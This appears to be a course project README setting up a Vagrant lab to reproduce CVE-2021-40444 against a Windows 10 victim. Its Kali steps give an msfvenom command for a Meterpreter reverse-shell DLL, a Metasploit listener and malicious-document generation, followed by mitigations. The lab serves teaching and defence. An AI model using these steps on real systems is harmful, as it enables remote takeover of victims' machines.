# TIC4301_Project
TIC4301 Project - CVE-2021-40444

Download the following vagrant boxes:
Kali  -  https://drive.google.com/file/d/1RegQcT2jjFoaQRgLjXDYl4iS0HNt_mU2/view?usp=sharing
Win10 -  https://drive.google.com/file/d/1zcLertRoI-FrHDkRq1NO-KHaF88bMv6e/view?usp=sharing

Import the boxes with the following commands through vagrant:
  1. vagrant box add kali_package.box
  2. vagrant box add victim_package.box
  3. vagrant init kali_package.box
  4. vagrant init victim_package.box
  5. vagrant up

Setup:
  Win10:
    1. In the win10 box, log in as administrator with the password vagrant.
    2. Right click script.ps1 on the desktop and run with powershell. (Leave this open)
    3. Run ipconfig.exe and obtain the address for this host.

  Kali:
    1. cd Desktop/CVE-2021-40444.
    2. generate your malicious dll with msfvenom. # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth1 LPORT=443 -f dll -o test/shell.dll
    3. start a listener in metasploit.
    4. generate the malicious document. # python3 exploit.py generate test/calc.dll http://<kali IP>
    5. visit http://<win 10 IP>/upload and upload the file.
    6. listen for the shell.
  
  Mitigations:
    1. Install KB5005565 hotfix.
    2. Edit windows registry with patch.reg in the repository.
  
  
